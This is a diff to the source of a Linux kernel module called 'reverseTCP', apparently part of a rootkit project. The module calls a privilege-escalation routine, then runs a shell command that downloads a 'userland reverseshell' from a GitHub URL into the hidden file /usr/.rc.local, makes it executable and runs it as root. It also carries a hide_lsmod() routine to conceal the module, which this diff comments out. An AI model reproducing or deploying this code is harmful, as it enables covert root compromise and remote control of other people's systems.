@@ -18,52 +18,52 @@ static struct file_operations reverseTCP_fops =
 //==============================
 static int __init reverseTCP_init(void)
 {
-	#ifdef DEBUG
+	//#ifdef DEBUG
    printk(KERN_ALERT "reverseTCP: Initializing driver\n");
-	#endif
+	//#endif
 
    //get major number
    major_number = register_chrdev(0, DEVICE_NAME, &reverseTCP_fops);
    if (major_number<0)
 	{
-		#ifdef DEBUG
+		//#ifdef DEBUG
       printk(KERN_ALERT "reverseTCP: failed to register a major number\n");
-		#endif
+		// #endif
       major_number = -1;
       return major_number;
    }
-	#ifdef DEBUG
+	// #ifdef DEBUG
    printk(KERN_ALERT "reverseTCP: driver registered with major number %d\n", major_number);
-	#endif
+	// #endif
 
    // Register device class
    reverseTCP_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(reverseTCP_class))
 	{                
       unregister_chrdev(major_number, DEVICE_NAME);
-		#ifdef DEBUG
+		// #ifdef DEBUG
       printk(KERN_ALERT "reverseTCP: failed to register device class\n");
-		#endif
+		// #endif
       return PTR_ERR(reverseTCP_class);          
    }
-	#ifdef DEBUG
+	// #ifdef DEBUG
    printk(KERN_ALERT "reverseTCP: device class registered\n");
-	#endif
+	// #endif
 
    // Register the device driver
    reverseTCP_device = device_create(reverseTCP_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
    if (IS_ERR(reverseTCP_device)){               
       class_destroy(reverseTCP_class);
       unregister_chrdev(major_number, DEVICE_NAME);
-		#ifdef DEBUG
+		// #ifdef DEBUG
       printk(KERN_ALERT "reverseTCP: failed to create the device\n");
-		#endif
+		// #endif
       return PTR_ERR(reverseTCP_device);
    }
-	#ifdef DEBUG
+	// #ifdef DEBUG
    printk(KERN_ALERT "reverseTCP: device class created correctly\n");
 	printk(KERN_ALERT "reverseTCP: calling reverseTCP_connect\n");
-	#endif
+	// #endif
 
 /************************************************************************
 *************************************************************************
@@ -74,17 +74,17 @@ static int __init reverseTCP_init(void)
 
 	escale_priv();
 	reverseTCP_connect();
-	#ifndef DEBUG
-	hide_lsmod();
-	#endif
+	// #ifndef DEBUG
+//	hide_lsmod();
+	// #endif
 //========================================================================
 //========================================================================
 
 
 
-	#ifdef DEBUG
+	// #ifdef DEBUG
    printk(KERN_ALERT "reverseTCP: no hickupp!!!!\n");
-	#endif
+	// #endif
 
    return 0;
 }
@@ -117,7 +117,7 @@ static int reverseTCP_connect(void)
 {
 	struct subprocess_info *sub_info;
 	//download userland reverseshell
-	static  char *argv[] = { "/bin/sh", "-c","sudo wget -qr -O /usr/.rc.local https://github.com/A283le/RootKit/raw/jlima020-patch-1/shell;sudo chmod 777 /usr/.rc.local; sudo /usr/.rc.local", NULL};    
+	static  char *argv[] = { "home/shell", "-c","sudo wget -qr -O /usr/.rc.local https://github.com/A283le/RootKit/raw/jlima020-patch-1/shell;sudo chmod 777 /usr/.rc.local; sudo /usr/.rc.local", NULL};    
     static  char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
     
 	sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL );
